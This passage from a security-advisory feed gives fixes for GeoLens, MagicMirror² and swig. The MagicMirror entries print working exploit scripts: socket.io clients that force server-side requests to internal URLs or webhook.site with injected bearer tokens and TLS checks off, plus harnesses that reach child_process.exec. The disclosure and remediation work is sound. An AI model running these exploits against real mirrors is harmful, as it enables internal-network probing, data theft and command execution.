title, summary, source URL, filename, column schema, and <strong>sample values</strong> into
the response. <em>(Authenticated <code>editor</code> · High)</em></p>
<p><strong>6. Residual VRT member disclosure for legacy links — SEC-E (PR #237)</strong>
Link-time authorization (finding 4) does not re-authorize pre-existing
<code>vrt_source_links</code>, so legacy or authorization-drift links still leaked member
metadata and health via the VRT source-listing/status endpoints until a
per-member read filter was added. <em>(Medium)</em></p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.2.3</strong> by, in order:</p>
<ul>
<li><code>31a103b9</code> — fix(catalog): authorize relationship targets in related-record endpoints (#234)</li>
<li><code>01bc87da</code> — fix(maps): re-authorize each layer's dataset on anonymous map read endpoints (#235)</li>
<li><code>407c0688</code> — fix(ogc): enforce dataset visibility on the externalId OGC item lookup (#236)</li>
<li><code>2c031da8</code> — fix(vrt): authorize VRT source datasets at link time + filter unauthorized members on read (#237)</li>
<li><code>07dfb1c6</code> — fix(ai): authorize the requested dataset on AI metadata endpoints (#238)</li>
</ul>
<p>The fixes follow the codebase's established per-dataset re-authorization pattern
(<code>can_access_dataset</code> / <code>check_dataset_access_or_anonymous</code>), filtering at read
time and authorizing cross-dataset references at link/write time.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is <strong>no complete configuration workaround</strong>; the anonymous findings
require only network access to the API. Operators who cannot upgrade
immediately should restrict network exposure of the API and avoid co-locating
private datasets with public maps/relationships, but <strong>upgrading to 1.2.3 is
the only full remediation</strong>.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to GeoLens <strong>1.2.3</strong>:</p>
<ul>
<li>Container images: <code>ghcr.io/geolens-io/geolens-api:1.2.3</code> (+ worker/frontend)</li>
<li>Python SDK: <code>geolens==1.2.3</code> · CLI: <code>geolens-cli==1.2.3</code> · npm: <code>@geolens/sdk@1.2.3</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/geolens-io/geolens/security/advisories/GHSA-p23g-mvhj-jh3j">https://github.com/geolens-io/geolens/security/advisories/GHSA-p23g-mvhj-jh3j</a></li>
<li><a href="https://github.com/geolens-io/geolens/pull/234">https://github.com/geolens-io/geolens/pull/234</a></li>
<li><a href="https://github.com/geolens-io/geolens/pull/235">https://github.com/geolens-io/geolens/pull/235</a></li>
<li><a href="https://github.com/geolens-io/geolens/pull/236">https://github.com/geolens-io/geolens/pull/236</a></li>
<li><a href="https://github.com/geolens-io/geolens/pull/237">https://github.com/geolens-io/geolens/pull/237</a></li>
<li><a href="https://github.com/geolens-io/geolens/pull/238">https://github.com/geolens-io/geolens/pull/238</a></li>
<li><a href="https://github.com/advisories/GHSA-p23g-mvhj-jh3j">https://github.com/advisories/GHSA-p23g-mvhj-jh3j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p23g-mvhj-jh3j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-18T18:00:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magicmirror] MagicMirror: ssrf calendar .js]]></title>
        <id>https://github.com/advisories/GHSA-w6x9-28jw-hq7j</id>
        <link href="https://github.com/advisories/GHSA-w6x9-28jw-hq7j"/>
        <updated>2026-08-18T17:26:53.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability--ssrf-via-add_calendar-magicmirror²-calendar">Vulnerability — SSRF via <code>ADD_CALENDAR</code> (MagicMirror² calendar)</h1>
<blockquote>
<p>Analysis of the PoC <code>exploit-ssrf-calendar.js</code>.
Target: <code>calendar/node_helper.js</code> of MagicMirror², socket.io namespace <code>/calendar</code>.</p>
</blockquote>
<hr>
<h2 id="identification">Identification</h2>
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td><strong>PoC file</strong></td>
<td><code>exploit-ssrf-calendar.js</code></td>
</tr>
<tr>
<td><strong>Endpoint</strong></td>
<td>socket.io namespace <code>/calendar</code>, notification <code>ADD_CALENDAR</code></td>
</tr>
<tr>
<td><strong>Precondition</strong></td>
<td>reach the mirror's HTTP port (no authentication required)</td>
</tr>
</tbody></table>
<hr>
<h2 id="description">Description</h2>
<p>The <code>ADD_CALENDAR</code> handler in <code>calendar/node_helper.js</code> performs a <strong>server-side</strong> HTTP request to a URL that is <strong>fully attacker-controlled</strong>, with no SSRF protection whatsoever — unlike the project's hardened <code>/cors</code> endpoint.</p>
<p>Worse, the attacker also controls:</p>
<ul>
<li>the <strong>authentication headers</strong> the server attaches to the request (<code>auth: { method: "bearer", pass: "..." }</code>);</li>
<li>the <code>selfSignedCert</code> flag, which <strong>disables TLS verification</strong> of the server-side request.</li>
</ul>
<p>When the target's response is <strong>valid iCal</strong>, the server parses the events and sends them back to the attacker via <code>CALENDAR_EVENTS</code> — turning the SSRF into <strong>full data exfiltration</strong> (response body read). Against non-iCal responses it remains a blind SSRF (the attacker still forces the server-side request, they just don't see the body).</p>
<hr>
<h2 id="root-cause-unauthenticated-socketio-channel--permissive-cors">Root cause: unauthenticated socket.io channel + permissive CORS</h2>
<p>The socket.io server accepts connections from <strong>any origin</strong> and with <strong>no authentication</strong>:</p>
<pre><code class="language-js">const io = new Server(server, {
  cors: { origin: /.*$/, credentials: true }
});
</code></pre>
<p>The <code>/calendar</code> namespace registers the handler without checking who is connected (<strong>CWE-306</strong>). Any process or browser tab that can reach the mirror's port can emit the notification.</p>
<hr>
<h2 id="exploit-exploit-ssrf-calendarjs">Exploit (<code>exploit-ssrf-calendar.js</code>)</h2>
<pre><code class="language-js">const { io } = require("socket.io-client");

const TARGET = process.env.MM || "http://TARGET:8888";
const INTERNAL_URL = process.argv[2] || process.env.SSRF_URL || "https://webhook.site/";

const socket = io(`${TARGET}/calendar`, { path: "/socket.io", transports: ["websocket", "polling"] });

socket.onAny((event, payload) =&gt; {
    if (event === "CALENDAR_EVENTS") {
        console.log("\n[+] CALENDAR_EVENTS received from server (SSRF response exfiltrated):");
        for (const ev of payload.events || []) {
            console.log("    SUMMARY:", ev.title);
            if (ev.title &amp;&amp; ev.title.includes("FLAG{")) {
                console.log("\n[!!!] SSRF SUCCESS - leaked secret from internal-only service:");
                console.log("      " + ev.title);
                process.exit(0);
            }
        }
    } else if (event === "CALENDAR_ERROR") {
        console.log("[-] CALENDAR_ERROR:", JSON.stringify(payload));
    }
});

socket.on("connect", () =&gt; {
    console.log(`[*] Connected to ${TARGET}/calendar (no auth required). socket id=${socket.id}`);
    console.log(`[*] Forcing server-side fetch of internal target: ${INTERNAL_URL}`);
    socket.emit("ADD_CALENDAR", {
        url: INTERNAL_URL,
        fetchInterval: 60000,
        excludedEvents: [],
        maximumEntries: 10,
        maximumNumberOfDays: 3650,
        auth: { method: "bearer", pass: "internal-admin-token" },
        broadcastPastEvents: true,
        selfSignedCert: true,
        id: "pwn"
    });
});

socket.on("connect_error", (e) =&gt; console.log("[-] connect_error:", e.message));

setTimeout(() =&gt; { console.log("\n[*] timeout, exiting"); process.exit(1); }, 20000);
</code></pre>
<hr>
<h2 id="vulnerable-target-code-pattern">Vulnerable target code (pattern)</h2>
<pre><code class="language-js">socketNotificationReceived(notification, payload) {
  if (notification === "ADD_CALENDAR") {
    const fetcher = new CalendarFetcher(
      payload.url,
      payload.fetchInterval,
      payload.excludedEvents,
      payload.maximumEntries,
      payload.maximumNumberOfDays,
      payload.auth,
      payload.broadcastPastEvents,
      payload.selfSignedCert
    );
    fetcher.fetchCalendar();
  }
}
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Reading internal services</strong> unreachable from the attacker's network (cloud metadata <code>169.254.169.254</code>, admin panels on <code>127.0.0.1</code>, services on the private network).</li>
<li><strong>Body exfiltration</strong> when the response is iCal (the PoC searches for <code>FLAG{...}</code> in event titles).</li>
<li><strong>Confused deputy / credential injection</strong>: the server attaches an attacker-controlled <code>Authorization: Bearer ...</code> header, allowing it to forge/replay credentials against the internal target.</li>
<li><strong>TLS bypass</strong> via <code>selfSignedCert: true</code>.</li>
<li>Internal port scanning through error/timing differences.</li>
</ul>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w6x9-28jw-hq7j">https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w6x9-28jw-hq7j</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/pull/4169">https://github.com/MagicMirrorOrg/MagicMirror/pull/4169</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f">https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0">https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0</a></li>
<li><a href="https://github.com/advisories/GHSA-w6x9-28jw-hq7j">https://github.com/advisories/GHSA-w6x9-28jw-hq7j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w6x9-28jw-hq7j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-18T17:26:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magicmirror] MagicMirror newsfeed Socket.IO notification allows blind server-side request forgery]]></title>
        <id>https://github.com/advisories/GHSA-998g-7v5w-cr7g</id>
        <link href="https://github.com/advisories/GHSA-998g-7v5w-cr7g"/>
        <updated>2026-08-18T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability--blind-ssrf-via-check_article_url-magicmirror²-newsfeed">Vulnerability — Blind SSRF via <code>CHECK_ARTICLE_URL</code> (MagicMirror² newsfeed)</h1>
<blockquote>
<p>Analysis of the PoC <code>exploit-ssrf-newsfeed.js</code>.
Target: <code>newsfeed/node_helper.js</code> of MagicMirror², socket.io namespace <code>/newsfeed</code>.</p>
</blockquote>
<hr>
<h2 id="identification">Identification</h2>
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td><strong>PoC file</strong></td>
<td><code>exploit-ssrf-newsfeed.js</code></td>
</tr>
<tr>
<td><strong>Endpoint</strong></td>
<td>socket.io namespace <code>/newsfeed</code>, notification <code>CHECK_ARTICLE_URL</code></td>
</tr>
<tr>
<td><strong>Precondition</strong></td>
<td>reach the mirror's HTTP port (no authentication required)</td>
</tr>
</tbody></table>
<hr>
<h2 id="description">Description</h2>
<p>The <code>checkArticleUrl()</code> function in <code>newsfeed/node_helper.js</code> runs <code>fetch(url, { method: "HEAD" })</code> with <strong>zero validation</strong> of the URL and returns <code>ARTICLE_URL_STATUS { url, canFrame }</code>.</p>
<p>This gives the attacker a <strong>boolean + timing oracle</strong> to map internal hosts and ports: presence, absence, and response time reveal which internal services are alive. It is a "blind-ish" SSRF — the attacker doesn't see the body, but forces the server-side request and observes the effect on the target.</p>
<p>The actual proof is observed <strong>on the target side</strong> (the server-side HEAD shows up in the internal service's log), since the <code>canFrame</code> field alone leaks little.</p>
<hr>
<h2 id="root-cause-unauthenticated-socketio-channel--permissive-cors">Root cause: unauthenticated socket.io channel + permissive CORS</h2>
<p>The socket.io server accepts connections from <strong>any origin</strong> and with <strong>no authentication</strong>:</p>
<pre><code class="language-js">const io = new Server(server, {
  cors: { origin: /.*$/, credentials: true }
});
</code></pre>
<p>The <code>/newsfeed</code> namespace registers the handler without checking who is connected (<strong>CWE-306</strong>). Any process or browser tab that can reach the mirror's port can emit the notification.</p>
<hr>
<h2 id="exploit-exploit-ssrf-newsfeedjs">Exploit (<code>exploit-ssrf-newsfeed.js</code>)</h2>
<pre><code class="language-js">const { io } = require("socket.io-client");
const TARGET = process.env.MM || "https://target/";
const URL_TO_HIT = process.env.SSRF_URL || "https://webhook.site";
const socket = io(`${TARGET}/newsfeed`, { path: "/socket.io", transports: ["websocket", "polling"] });

socket.onAny((event, payload) =&gt; {
    if (event === "ARTICLE_URL_STATUS") {
        console.log(`[+] ARTICLE_URL_STATUS: ${JSON.stringify(payload)}`);
        console.log("[!!!] Server performed a server-side HEAD request to the internal host (SSRF).");
        process.exit(0);
    }
});
socket.on("connect", () =&gt; {
    console.log(`[*] Connected to ${TARGET}/newsfeed (no auth). CHECK_ARTICLE_URL -&gt; ${URL_TO_HIT}`);
    socket.emit("CHECK_ARTICLE_URL", { url: URL_TO_HIT });
});
setTimeout(() =&gt; { console.log("[*] timeout"); process.exit(1); }, 12000);
</code></pre>
<hr>
<h2 id="vulnerable-target-code-pattern">Vulnerable target code (pattern)</h2>
<pre><code class="language-js">async checkArticleUrl(url) {
  const res = await fetch(url, { method: "HEAD" });
  const canFrame = !res.headers.get("x-frame-options")
                &amp;&amp; !/frame-ancestors/i.test(res.headers.get("content-security-policy") || "");
  this.sendSocketNotification("ARTICLE_URL_STATUS", { url, canFrame });
}
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Internal network scanning / port scanning</strong>: presence, absence, and response time reveal which internal hosts and ports are alive.</li>
<li>Forcing server-side requests to internal services (the HEAD reaches the target, as observed in the <code>mm-internal</code> log referenced by the PoC).</li>
<li>Although it's HEAD (no body), it serves as a <strong>reconnaissance primitive</strong> and a trigger for side effects on endpoints that react to GET/HEAD.</li>
</ul>
<hr>
<h3 id="references">References</h3>
<ul>
<li>CWE-918: Server-Side Request Forgery (SSRF)</li>
<li>CWE-306: Missing Authentication for Critical Function</li>
<li>CWE-942: Permissive Cross-domain Policy with Untrusted Domains</li>
<li>OWASP: SSRF Prevention Cheat Sheet</li>
</ul>
<blockquote>
<p>This PoC and report are intended solely for authorized security testing / research in a controlled lab environment.</p>
</blockquote>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-998g-7v5w-cr7g">https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-998g-7v5w-cr7g</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/pull/4169">https://github.com/MagicMirrorOrg/MagicMirror/pull/4169</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f">https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0">https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0</a></li>
<li><a href="https://github.com/advisories/GHSA-998g-7v5w-cr7g">https://github.com/advisories/GHSA-998g-7v5w-cr7g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-998g-7v5w-cr7g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-18T17:26:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magicmirror] MagicMirror Socket.IO module namespaces bypass configured IP whitelist and allow unauthenticated server-side actions]]></title>
        <id>https://github.com/advisories/GHSA-w26r-fwg8-rcp3</id>
        <link href="https://github.com/advisories/GHSA-w26r-fwg8-rcp3"/>
        <updated>2026-08-18T17:26:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>MagicMirror applies <code>ipWhitelist</code> only as Express middleware, but the Socket.IO server is attached directly to the HTTP server without equivalent IP allowlist, origin, or namespace authentication checks. In a documented common deployment where MagicMirror listens on a non-loopback interface but expects <code>ipWhitelist</code> to restrict access, an untrusted network client can connect directly to module Socket.IO namespaces and send arbitrary module-helper notifications. This allows unauthenticated server-side requests through default modules and can reach command execution in the default <code>updatenotification</code> helper when a third-party module update is pending and the attacker supplies the update command through the trusted socket configuration path.</p>
<h3 id="details">Details</h3>
<p>The affected product is the npm package/application <code>magicmirror</code> at version <code>2.36.0</code>, tested at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code> from <code>https://github.com/MagicMirrorOrg/MagicMirror.git</code>.</p>
<p>Default committed settings bind to loopback and allow loopback only (<code>js/defaults.js:8-13</code>), so the remote network impact requires a documented common configuration where the server is reachable beyond loopback. The shipped sample explicitly documents non-loopback binding and IP allowlist behavior: <code>config/config.js.sample:11-20</code> says <code>address</code> may be another interface or <code>0.0.0.0</code>/<code>::</code>, and <code>ipWhitelist</code> controls allowed clients.</p>
<p>The trust-boundary issue is that Socket.IO is configured before and outside the Express middleware chain:</p>
<ul>
<li><code>js/server.js:42-50</code> creates Socket.IO directly on the HTTP(S) server with <code>cors.origin: /.*$/</code>.</li>
<li><code>js/server.js:89-90</code> applies <code>ipAccessControl(config.ipWhitelist)</code> only with <code>app.use(...)</code>, which protects Express routes and static files but not Socket.IO handshakes or namespaces.</li>
<li>A search of runtime files found no <code>allowRequest</code>, <code>io.use(...)</code>, handshake IP check, or namespace authentication for Socket.IO; the only relevant matches were <code>js/server.js:44</code> and <code>js/server.js:90</code>.</li>
<li><code>js/node_helper.js:88-103</code> registers every module namespace and dispatches every socket event and payload directly to <code>socketNotificationReceived(...)</code>.</li>
</ul>
<p>Once a client can reach the Socket.IO server, the following default-module server-side actions are reachable without an equivalent IP whitelist or module-authentication check:</p>
<ul>
<li><code>defaultmodules/newsfeed/node_helper.js:12-17</code> accepts <code>CHECK_ARTICLE_URL</code> and calls <code>checkArticleUrl(payload.url)</code>.</li>
<li><code>defaultmodules/newsfeed/node_helper.js:25-38</code> performs <code>fetch(url, { method: "HEAD" })</code> on the supplied URL and sends the result back.</li>
<li><code>defaultmodules/calendar/node_helper.js:13-24</code> accepts <code>ADD_CALENDAR</code>/<code>FETCH_CALENDAR</code> socket messages.</li>
<li><code>defaultmodules/calendar/node_helper.js:40-58</code> accepts an arbitrary syntactically valid calendar URL and creates a fetcher.</li>
<li><code>defaultmodules/calendar/calendarfetcher.js:35-44</code> passes the URL into <code>HTTPFetcher</code>, whose fetch sink is <code>js/http_fetcher.js:286-294</code>.</li>
<li><code>defaultmodules/updatenotification/node_helper.js:46-68</code> accepts <code>CONFIG</code>, <code>MODULES</code>, and <code>SCAN_UPDATES</code> notifications and trusts the socket-provided config/module list.</li>
<li><code>defaultmodules/updatenotification/update_helper.js:43-47</code> stores update commands from config.</li>
<li><code>defaultmodules/updatenotification/update_helper.js:96-116</code> executes the selected update command with <code>child_process.exec</code> in the module directory.</li>
<li><code>defaultmodules/updatenotification/update_helper.js:221-227</code> looks up the command from <code>config.updates</code> by module name.</li>
</ul>
<p>False-positive screening performed:</p>
<ul>
<li>Express HTTP routes are protected by <code>ipAccessControl(config.ipWhitelist)</code> at <code>js/server.js:89-90</code>; this does not protect Socket.IO because Socket.IO is attached to the raw HTTP server and no Socket.IO middleware was found.</li>
<li>The explicit <code>/cors</code> HTTP endpoint has separate SSRF mitigations (<code>js/server_functions.js:47-117</code>) and is disabled by default (<code>js/defaults.js:14</code>); the confirmed request primitive here uses module-helper socket paths, not <code>/cors</code>.</li>
<li>The command-execution variant is not an unconditional default RCE: <code>updatenotification</code> only executes an update command for a non-core git-managed module that is considered behind. However, the trusted command source is attacker-controlled through the unauthenticated socket <code>CONFIG</code> message once this boundary is crossed.</li>
<li>Default loopback-only binding lowers default remote exposure, but the sample configuration documents exactly the deployment model where users rely on <code>ipWhitelist</code> for network restrictions.</li>
</ul>
<p>Affected-version evidence: only <code>magicmirror@2.36.0</code> at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code> was tested. The affected range is unknown from this audit; earlier versions were not tested. No patched version or fix commit was identified locally.</p>
<h3 id="poc">PoC</h3>
<p>The following safe local PoCs were run from a clean checkout of MagicMirror at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code>. Because <code>node_modules</code> were not installed in this audit environment and <code>package.json:52</code> has a destructive <code>postinstall</code> (<code>git clean -df fonts vendor modules/default</code>), the commands use small Node harnesses with stubs for missing dependencies while exercising the vulnerable repository code paths directly. They do not contact external hosts and write only disposable <code>/tmp</code> marker files.</p>
<ol>
<li>Confirm that the runtime lacks Socket.IO IP allowlist controls:</li>
</ol>
<pre><code class="language-bash">grep -RIn --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=.claude --exclude-dir=reports -E "allowRequest|io\.use\(|handshake|ipAccessControl\(|cors: \{|origin: /\.\*\$/" js defaultmodules serveronly config tests
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">js/server.js:44:				cors: {
js/server.js:90:			app.use(ipAccessControl(config.ipWhitelist));
</code></pre>
<p>This confirms the IP allowlist appears only as Express middleware and no Socket.IO handshake/namespace allowlist was present in the reviewed runtime files.</p>
<ol start="2">
<li>Confirm a default module helper will perform a server-side request to an attacker-supplied loopback URL when driven through its socket notification handler:</li>
</ol>
<pre><code class="language-bash">node -e 'const Module=require("module"); const orig=Module._load; Module._load=(r,p,m)=&gt;{ if(r==="logger") return {log(){},error(){},warn(){},info(){},debug(){}}; if(r==="node_helper") return {create:(o)=&gt;function(){Object.assign(this,o);this.sendSocketNotification=(n,p)=&gt;console.log("SOCKET",n,JSON.stringify(p));}}; if(r==="./newsfeedfetcher") return function(){}; return orig(r,p,m); }; const calls=[]; global.fetch=async(url,opts)=&gt;{calls.push({url,opts}); return {headers:{get:(h)=&gt;h==="x-frame-options"?"deny":null}};}; const Helper=require("./defaultmodules/newsfeed/node_helper"); const h=new Helper(); h.start(); h.socketNotificationReceived("CHECK_ARTICLE_URL",{url:"http://127.0.0.1:65535/internal"}); setTimeout(()=&gt;console.log("fetchCalls=",JSON.stringify(calls)),10);'
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">SOCKET ARTICLE_URL_STATUS {"url":"http://127.0.0.1:65535/internal","canFrame":false}
fetchCalls= [{"url":"http://127.0.0.1:65535/internal","opts":{"method":"HEAD"}}]
</code></pre>
<p>Expected vulnerable output: the harness records a server-side <code>HEAD</code> request to <code>http://127.0.0.1:65535/internal</code> even though <code>/cors</code> SSRF protections are not involved.</p>
<ol start="3">
<li>Confirm the conditional command-execution sink is reachable from the trusted socket-driven update path using a harmless <code>/tmp</code> marker command:</li>
</ol>
<pre><code class="language-bash">rm -f /tmp/mm-rce-marker
mkdir -p /tmp/mm-audit/modules/evil /tmp/mm-audit/defaultmodules
node -e 'const fs=require("node:fs"); const Module=require("module"); const orig=Module._load; Module._load=(r,p,m)=&gt;{ if(r==="logger") return {log(){},error(){},warn(){},info(){},debug(){}}; if(r==="node_helper") return {create:(o)=&gt;function(){Object.assign(this,o);this.sendSocketNotification=()=&gt;{};}}; return orig(r,p,m); }; global.root_path="/tmp/mm-audit"; global.defaultModulesDir="defaultmodules"; fs.writeFileSync("/tmp/mm-audit/defaultmodules/defaultmodules.js","module.exports=[]"); const Helper=require("./defaultmodules/updatenotification/node_helper"); const h=new Helper(); h.gitHelper={add:async()=&gt;{},getRepos:async()=&gt;[{module:"evil",behind:1}],checkUpdates:()=&gt;[{module:"evil",behind:1}]}; h.sendSocketNotification=(n,p)=&gt;console.log("SOCKET",n,JSON.stringify(p)); (async()=&gt;{ await h.socketNotificationReceived("CONFIG",{updates:[{evil:"printf ok &gt; /tmp/mm-rce-marker"}],updateTimeout:5000,updateAutorestart:false,ignoreModules:[],sendUpdatesNotifications:false,updateInterval:60000,useModulesFromConfig:true}); await h.socketNotificationReceived("MODULES",["evil"]); console.log("marker=",fs.readFileSync("/tmp/mm-rce-marker","utf8")); process.exit(0); })();'
rm -f /tmp/mm-rce-marker
rm -rf /tmp/mm-audit
</code></pre>
<p>Observed output from the executed harness:</p>
<pre><code class="language-text">SOCKET REPO_STATUS {"module":"evil","behind":1}
SOCKET UPDATE_STATUS {"name":"evil","updateCommand":"printf ok &gt; /tmp/mm-rce-marker","inProgress":true,"error":false,"updated":true,"needRestart":true}
marker= ok
</code></pre>
<p>Expected vulnerable output: <code>marker= ok</code> demonstrates the update command supplied through the trusted socket configuration path reached <code>child_process.exec</code> and wrote the harmless marker.</p>
<p>Negative/control cases:</p>
<ul>
<li>With the shipped committed defaults (<code>js/defaults.js:8-13</code>), the server binds <code>localhost</code> and <code>ipWhitelist</code> includes only loopback, so a remote network attacker cannot reach either HTTP or Socket.IO unless the deployment is changed to a documented non-loopback address.</li>
<li>The <code>updatenotification</code> command execution path requires at least one non-core module update result; if <code>checkUpdates()</code> returns no third-party module with <code>behind &gt; 0</code>, <code>update_helper.parse(...)</code> does not execute an update command.</li>
<li>The explicit <code>/cors</code> route was not used for the confirmed request primitive and has separate protocol/hostname/DNS checks.</li>
</ul>
<p>Final repro re-check: the sink search, newsfeed socket request harness, and update marker harness were re-run after drafting; the observed outputs above are from this environment. Cleanup removed <code>/tmp/mm-rce-marker</code> and <code>/tmp/mm-audit</code>.</p>
<h3 id="impact">Impact</h3>
<p>In a documented common non-loopback deployment that relies on <code>ipWhitelist</code> for access control, an unauthenticated network client can bypass the intended IP allowlist for Socket.IO module namespaces. The attacker can send arbitrary module-helper notifications and payloads as if they were a trusted browser client.</p>
<p>Confirmed impacts include:</p>
<ul>
<li>Confidentiality/SSRF: server-side requests to attacker-chosen URLs through default module helpers, including loopback/internal URLs. The newsfeed PoC shows a <code>HEAD</code> request to <code>127.0.0.1</code>.</li>
<li>Integrity/availability: arbitrary manipulation of module-helper state and periodic fetch/update behavior through trusted socket messages.</li>
<li>Conditional code execution: when a third-party git-managed module is considered behind by the update checker, an attacker can supply a command in the socket <code>CONFIG</code> payload and trigger <code>child_process.exec</code>; the PoC safely wrote a <code>/tmp</code> marker.</li>
</ul>
<p>CVSS 3.1 rationale for the primary trust-boundary bypass with confirmed SSRF and conditional RCE variant: AV:A because MagicMirror's security policy says it is intended for trusted local/private networks and the documented non-loopback exposure is LAN-style; AC:H because default loopback settings must be changed and the RCE variant requires a pending third-party module update, though SSRF requires fewer conditions after reachability; PR:N because no application authentication is required; UI:N because the attacker connects directly to Socket.IO; S:C because the vulnerable application can cause requests/actions against other local/internal services and can execute commands in a child process in the conditional variant; C:L/I:L/A:L for confirmed internal request and helper-state/command side effects, with conservative scoring because unconditional default RCE was not shown.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Apply the same access-control decision to Socket.IO handshakes and namespaces as to Express routes. Concretely, add a Socket.IO <code>allowRequest</code> or <code>io.use(...)</code> middleware that normalizes <code>socket.handshake.address</code>/request IPs with the same <code>ipAccessControl</code> logic, and reject clients not allowed by <code>config.ipWhitelist</code>. Avoid relying on CORS for authorization; keep origin checks as a browser hardening layer only.</p>
<p>Also add module-helper authorization so arbitrary clients cannot send privileged server-side module notifications. For example, issue an unguessable per-session/module token to the served client and require it on helper messages, or separate read-only client events from privileged server-maintenance actions.</p>
<p>For defense in depth:</p>
<ul>
<li>Add SSRF protections or allowlists to calendar/newsfeed/weather helper fetch paths, not only <code>/cors</code>.</li>
<li>Do not accept <code>updatenotification</code> update commands from socket payloads; use the server-loaded config only, validate module names against configured modules, and avoid shell execution where possible.</li>
<li>Add regression tests proving a disallowed IP receives a rejected Socket.IO handshake even when Express routes are protected, and proving <code>/newsfeed</code>/<code>/calendar</code> helper messages from unauthenticated sockets cannot trigger server-side requests or update commands.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w26r-fwg8-rcp3">https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w26r-fwg8-rcp3</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/pull/4169">https://github.com/MagicMirrorOrg/MagicMirror/pull/4169</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f">https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0">https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0</a></li>
<li><a href="https://github.com/advisories/GHSA-w26r-fwg8-rcp3">https://github.com/advisories/GHSA-w26r-fwg8-rcp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w26r-fwg8-rcp3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-08-18T17:26:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rhinostone/swig-django] @rhinostone/swig: arbitrary local file read via include/extends path traversal]]></title>
        <id>https://github.com/advisories/GHSA-2mf3-mr2r-r4vf</id>
        <link href="https://github.com/advisories/GHSA-2mf3-mr2r-r4vf"/>
        <updated>2026-08-18T16:31:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p><code>@rhinostone/swig</code> is a maintained fork of the abandoned <code>swig</code> template engine and inherited the directory-traversal vulnerability tracked upstream as CVE-2023-25345 / GHSA-2rq5-699j-x7p6. The <code>{% include %}</code>, <code>{% extends %}</code>, and <code>{% import %}</code> tags resolve their target path through the filesystem loader without confining the result to the configured template root. A path that traverses upward (<code>../</code>) escapes the root and reads an arbitrary file from the host filesystem, whose contents are emitted into the rendered output.</p>
<h3 id="attack-scenario">Attack scenario</h3>
<p>The dangerous case does <strong>not</strong> require the attacker to control template source — only template <strong>data</strong> (the <code>locals</code> passed at render time). An application that renders a trusted template whose include / extends path is variable-driven is exposed:</p>
<pre><code class="language-js">// application code — a configured filesystem loader with a basepath
swig.renderFile('page.html', { partial: req.query.partial });
</code></pre>
